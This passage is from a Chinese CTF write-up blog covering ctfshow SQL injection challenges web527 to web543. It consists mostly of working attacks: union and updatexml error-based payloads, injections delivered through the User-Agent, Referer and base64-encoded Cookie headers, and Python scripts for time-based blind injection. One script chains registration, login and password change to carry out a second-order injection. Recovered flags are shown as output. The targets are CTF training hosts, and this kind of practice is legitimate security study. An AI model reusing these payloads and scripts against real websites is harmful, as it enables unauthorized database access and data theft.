class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        url_get = url + payload.format(sql,i,mid)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.get(url=url_get, timeout=<span class="number">0.5</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(i))</span><br><span class="line">        flag += chr(tail)</span><br><span class="line">        print(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'[*] Complete! Result Is &gt;&gt;&gt; &#123;&#125;'</span>.format(flag))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web527"><a href="#web527" class="headerlink" title="web527"></a>web527</h2><blockquote>
<p>post传参</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">passwd=1&amp;uname=1' union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> flag43s <span class="keyword">from</span> ctfshow.flagugsd) <span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web528"><a href="#web528" class="headerlink" title="web528"></a>web528</h2><blockquote>
<p>变双引号</p>
</blockquote>
<h2 id="web529"><a href="#web529" class="headerlink" title="web529"></a>web529</h2><blockquote>
<p>报错注入</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">passwd&#x3D;1&amp;uname&#x3D;1&#39;) or updatexml(1,concat(0x3d,(select flag4 from ctfshow.flag)),1) %23</span><br><span class="line"></span><br><span class="line">ctfshow&#123;571f6255-96ec-4007-98d4</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">passwd&#x3D;1&amp;uname&#x3D;1&#39;) or updatexml(1,concat(0x3d,(select right(flag4,20) from ctfshow.flag)),1) %23</span><br><span class="line"></span><br><span class="line">ctfshow&#123;571f6255-96ec-4007-98d4-c1d8fdc4a34f&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="web530"><a href="#web530" class="headerlink" title="web530"></a>web530</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;fe8d3ab8-7c4e-4f35-92c9</span><br><span class="line">5-92c9-927b68c5e708&#125;</span><br><span class="line">ctfshow&#123;fe8d3ab8-7c4e-4f35-92c9-927b68c5e708&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">passwd=1&amp;uname=1" or updatexml(1,concat(0x3d,(<span class="keyword">select</span> <span class="keyword">right</span>(<span class="keyword">group_concat</span>(flag4s),<span class="number">20</span>) <span class="keyword">from</span> ctfshow.flagb)),<span class="number">1</span>)  <span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web531"><a href="#web531" class="headerlink" title="web531"></a>web531</h2><blockquote>
<p>post传参的时间盲注，改一下代码跑</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/10</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://73347aaf-bfb6-42f5-b067-4f280ab6dd4f.challenge.ctf.show:8080/"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="comment">#--------查库名</span></span><br><span class="line"><span class="comment">#sql="select group_concat(schema_name) from information_schema.schemata"</span></span><br><span class="line"><span class="comment">#--------查表</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'"</span></span><br><span class="line"><span class="comment">#--------查字段</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(column_name) from information_schema.columns where table_schema='ctfshow' and table_name='flagba'"</span></span><br><span class="line"><span class="comment">#--------查flag</span></span><br><span class="line">sql= <span class="string">"select flag4sa from ctfshow.flagba"</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line">payload = <span class="string">"1' or if(ascii(substr((&#123;&#125;),&#123;&#125;,1))&gt;'&#123;&#125;',sleep(0.1),1) #"</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'uname'</span>: payload.format(sql,i,mid),</span><br><span class="line">            <span class="string">'passwd'</span>:<span class="string">'1'</span></span><br><span class="line">        &#125;</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        end = time.time()</span><br><span class="line">        print(end -start)</span><br><span class="line">        <span class="keyword">if</span> end-start &gt; <span class="number">1.4</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(i))</span><br><span class="line">        flag += chr(tail)</span><br><span class="line">        print(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'[*] Complete! Result Is &gt;&gt;&gt; &#123;&#125;'</span>.format(flag))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web532"><a href="#web532" class="headerlink" title="web532"></a>web532</h2><blockquote>
<p>改一下闭合的参数为双引号加个括号</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/10</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://dcea8cdc-a6c5-40ad-9d08-ad98fb744785.challenge.ctf.show:8080/"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="comment">#--------查库名</span></span><br><span class="line"><span class="comment">#sql="select group_concat(schema_name) from information_schema.schemata"</span></span><br><span class="line"><span class="comment">#--------查表</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'"</span></span><br><span class="line"><span class="comment">#--------查字段</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(column_name) from information_schema.columns where table_schema='ctfshow' and table_name='flagbab'"</span></span><br><span class="line"><span class="comment">#--------查flag</span></span><br><span class="line">sql= <span class="string">"select flag4sa from ctfshow.flagbab"</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line">payload = <span class="string">'1") or if(ascii(substr((&#123;&#125;),&#123;&#125;,1))&gt;"&#123;&#125;",sleep(0.1),1) #'</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'uname'</span>: payload.format(sql,i,mid),</span><br><span class="line">            <span class="string">'passwd'</span>:<span class="string">'1'</span></span><br><span class="line">        &#125;</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        end = time.time()</span><br><span class="line">        print(end -start)</span><br><span class="line">        <span class="keyword">if</span> end-start &gt; <span class="number">1.4</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(i))</span><br><span class="line">        flag += chr(tail)</span><br><span class="line">        print(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'[*] Complete! Result Is &gt;&gt;&gt; &#123;&#125;'</span>.format(flag))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web533"><a href="#web533" class="headerlink" title="web533"></a>web533</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;1&#39; or updatexml(1,concat(0x3d,(select right(flag4,20) from ctfshow.flag)),1) #</span><br><span class="line"></span><br><span class="line"> ctfshow&#123;03109730-de56-4be1-89cd</span><br><span class="line"> 1-89cd-ad2c56b2665c&#125;</span><br><span class="line"> ctfshow&#123;03109730-de56-4be1-89cd-ad2c56b2665c&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="web534"><a href="#web534" class="headerlink" title="web534"></a>web534</h2><blockquote>
<p>简单的报错注入，我写个脚本，学习怎么写headers</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/10</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://dce29b55-ff5f-4e47-a361-8f1cb2fa6b27.challenge.ctf.show:8080"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="comment">#--------查库名</span></span><br><span class="line"><span class="comment">#sql="select group_concat(schema_name) from information_schema.schemata"</span></span><br><span class="line"><span class="comment">#--------查表</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'"</span></span><br><span class="line"><span class="comment">#--------查字段</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(column_name) from information_schema.columns where table_schema='ctfshow' and table_name='flag'"</span></span><br><span class="line"><span class="comment">#--------查flag</span></span><br><span class="line">sql= <span class="string">"select right(flag4,20) from ctfshow.flag"</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line">payload = <span class="string">"'and updatexml(1,concat(0x3d,(&#123;&#125;)),1),1)#"</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"User-Agent"</span> : payload.format(sql)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'uname'</span> : <span class="string">'admin'</span>,</span><br><span class="line">    <span class="string">'passwd'</span> : <span class="string">'admin'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url, data = data, headers = headers)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure></div>

<h2 id="web535"><a href="#web535" class="headerlink" title="web535"></a>web535</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/10</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://6385c207-f30c-41ee-9767-bbfa5b90f2b5.challenge.ctf.show:8080/"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="comment">#--------查库名</span></span><br><span class="line"><span class="comment">#sql="select group_concat(schema_name) from information_schema.schemata"</span></span><br><span class="line"><span class="comment">#--------查表</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'"</span></span><br><span class="line"><span class="comment">#--------查字段</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(column_name) from information_schema.columns where table_schema='ctfshow' and table_name='flag'"</span></span><br><span class="line"><span class="comment">#--------查flag</span></span><br><span class="line">sql= <span class="string">"select right(flag4,20) from ctfshow.flag"</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line">payload = <span class="string">"'and updatexml(1,concat(0x3d,(&#123;&#125;)),1),1)#"</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="comment">#"User-Agent" : payload.format(sql)</span></span><br><span class="line">    <span class="string">'Referer'</span>: payload.format(sql)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'uname'</span> : <span class="string">'admin'</span>,</span><br><span class="line">    <span class="string">'passwd'</span> : <span class="string">'admin'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url, data = data, headers = headers)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure></div>

<h2 id="web536"><a href="#web536" class="headerlink" title="web536"></a>web536</h2><blockquote>
<p>做完了忘贴了，这是下一题的payload其实是一个意思，就是把base64加密去掉</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/10</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://7ee17c1d-22b6-4e22-b969-4d2e06d73041.challenge.ctf.show:8080/"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="comment">#--------查库名</span></span><br><span class="line"><span class="comment">#sql="select group_concat(schema_name) from information_schema.schemata"</span></span><br><span class="line"><span class="comment">#--------查表</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'"</span></span><br><span class="line"><span class="comment">#--------查字段</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(column_name) from information_schema.columns where table_schema='ctfshow' and table_name='flag'"</span></span><br><span class="line"><span class="comment">#--------查flag</span></span><br><span class="line">sql= <span class="string">"select right(flag4,20) from ctfshow.flag"</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="comment">#"User-Agent" : payload.format(sql)</span></span><br><span class="line">    <span class="comment">#'Referer': payload.format(sql)</span></span><br><span class="line">    <span class="string">'Cookie'</span> : <span class="string">'uname='</span> + base64.b64encode(<span class="string">f"admin') and updatexml(1,concat(0x3d,(<span class="subst">&#123;sql&#125;</span>)),1) #"</span>.encode()).decode()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'uname'</span> : <span class="string">'admin'</span>,</span><br><span class="line">    <span class="string">'passwd'</span> : <span class="string">'admin'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url, data = data, headers = headers)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure></div>

<h2 id="web537"><a href="#web537" class="headerlink" title="web537"></a>web537</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/10</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://7ee17c1d-22b6-4e22-b969-4d2e06d73041.challenge.ctf.show:8080/"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="comment">#--------查库名</span></span><br><span class="line"><span class="comment">#sql="select group_concat(schema_name) from information_schema.schemata"</span></span><br><span class="line"><span class="comment">#--------查表</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'"</span></span><br><span class="line"><span class="comment">#--------查字段</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(column_name) from information_schema.columns where table_schema='ctfshow' and table_name='flag'"</span></span><br><span class="line"><span class="comment">#--------查flag</span></span><br><span class="line">sql= <span class="string">"select right(flag4,20) from ctfshow.flag"</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="comment">#"User-Agent" : payload.format(sql)</span></span><br><span class="line">    <span class="comment">#'Referer': payload.format(sql)</span></span><br><span class="line">    <span class="string">'Cookie'</span> : <span class="string">'uname='</span> + base64.b64encode(<span class="string">f"admin') and updatexml(1,concat(0x3d,(<span class="subst">&#123;sql&#125;</span>)),1) #"</span>.encode()).decode()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'uname'</span> : <span class="string">'admin'</span>,</span><br><span class="line">    <span class="string">'passwd'</span> : <span class="string">'admin'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url, data = data, headers = headers)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure></div>

<h2 id="web538"><a href="#web538" class="headerlink" title="web538"></a>web538</h2><blockquote>
<p>闭合变双引号</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/10</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://226925d4-af60-4fd1-a5ea-ca56cec0368e.challenge.ctf.show:8080/"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="comment">#--------查库名</span></span><br><span class="line"><span class="comment">#sql="select group_concat(schema_name) from information_schema.schemata"</span></span><br><span class="line"><span class="comment">#--------查表</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'"</span></span><br><span class="line"><span class="comment">#--------查字段</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(column_name) from information_schema.columns where table_schema='ctfshow' and table_name='flag'"</span></span><br><span class="line"><span class="comment">#--------查flag</span></span><br><span class="line">sql= <span class="string">"select flag4 from ctfshow.flag"</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="comment">#"User-Agent" : payload.format(sql)</span></span><br><span class="line">    <span class="comment">#'Referer': payload.format(sql)</span></span><br><span class="line">    <span class="string">'Cookie'</span> : <span class="string">'uname='</span> + base64.b64encode(<span class="string">f'admin" and updatexml(1,concat(0x3d,(<span class="subst">&#123;sql&#125;</span>)),1) #'</span>.encode()).decode()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'uname'</span> : <span class="string">'admin'</span>,</span><br><span class="line">    <span class="string">'passwd'</span> : <span class="string">'admin'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url, data = data, headers = headers)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure></div>

<h2 id="web539"><a href="#web539" class="headerlink" title="web539"></a>web539</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://64dcaaed-8f7c-491e-9b4c-8ebb54ae8374.challenge.ctf.show:<span class="number">8080</span>/?<span class="keyword">id</span>=<span class="number">1.1</span><span class="string">' or  updatexml(1,concat(0x3d,(select right(flag4,20) from ctfshow.flag)),1) and '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web540"><a href="#web540" class="headerlink" title="web540"></a>web540</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/10</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="comment">#--------查库名</span></span><br><span class="line"><span class="comment">#sql="select group_concat(schema_name) from information_schema.schemata"</span></span><br><span class="line"><span class="comment">#--------查表</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'"</span></span><br><span class="line"><span class="comment">#--------查字段</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(column_name) from information_schema.columns where table_schema='ctfshow' and table_name='flag'"</span></span><br><span class="line"><span class="comment">#--------查flag</span></span><br><span class="line">sql= <span class="string">"select flag4 from ctfshow.flag"</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line">payload = <span class="string">"admin' and if(ascii(substr((&#123;&#125;),&#123;&#125;,1))&gt;'&#123;&#125;',sleep(0.4),0)#"</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">666</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head+tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        url_register = <span class="string">"http://08fa48c9-0e53-4eec-8fa2-01e851961687.challenge.ctf.show:8080/login_create.php"</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span> : payload.format(sql,i,mid),</span><br><span class="line">            <span class="string">'password'</span> : <span class="string">'22'</span>,</span><br><span class="line">            <span class="string">'re_password'</span> : <span class="string">'22'</span>,</span><br><span class="line">            <span class="string">'submit'</span> : <span class="string">'Register'</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = session.post(url=url_register,data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        url_login = <span class="string">"http://08fa48c9-0e53-4eec-8fa2-01e851961687.challenge.ctf.show:8080/login.php"</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'login_user'</span> : payload.format(sql,i,mid),</span><br><span class="line">            <span class="string">'login_password'</span> : <span class="string">'22'</span>,</span><br><span class="line">            <span class="string">'mysubmit'</span> : <span class="string">'Login'</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = session.post(url=url_login, data=data)</span><br><span class="line"></span><br><span class="line">        url_change = <span class="string">"http://08fa48c9-0e53-4eec-8fa2-01e851961687.challenge.ctf.show:8080/pass_change.php"</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'current_password'</span> : <span class="string">'22'</span>,</span><br><span class="line">            <span class="string">'password'</span> : <span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'re_password'</span> : <span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'submit'</span> : <span class="string">'Reset'</span></span><br><span class="line">        &#125;</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = session.post(url=url_change, data=data)</span><br><span class="line">        end = time.time()</span><br><span class="line">        print(end - start)</span><br><span class="line">        <span class="keyword">if</span> end-start &gt; <span class="number">0.4</span> <span class="keyword">and</span> end-start &lt; <span class="number">1</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(i))</span><br><span class="line">        flag += chr(tail)</span><br><span class="line">        print(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'[*] Complete! Result Is &gt;&gt;&gt; &#123;&#125;'</span>.format(flag))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web541"><a href="#web541" class="headerlink" title="web541"></a>web541</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://d0b25a37-1ec0-488a-88ea-c4a6f2d780a2.challenge.ctf.show:<span class="number">8080</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' || updatexml(1,concat(0x3d,(select group_concat(flag4s) from ctfshow.flags )),1)%23</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web542"><a href="#web542" class="headerlink" title="web542"></a>web542</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://11917581-19a3-4e00-83bf-7d5dd5e7a4d3.challenge.ctf.show:<span class="number">8080</span>/?<span class="keyword">id</span>=<span class="number">1.1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(flag4s) <span class="keyword">from</span> ctfshow.flags)</span><br></pre></td></tr></table></figure></div>

<h2 id="web543"><a href="#web543" class="headerlink" title="web543"></a>web543</h2><blockquote>
<p>基本的当空格的符号都被过滤了</p>
</blockquote>
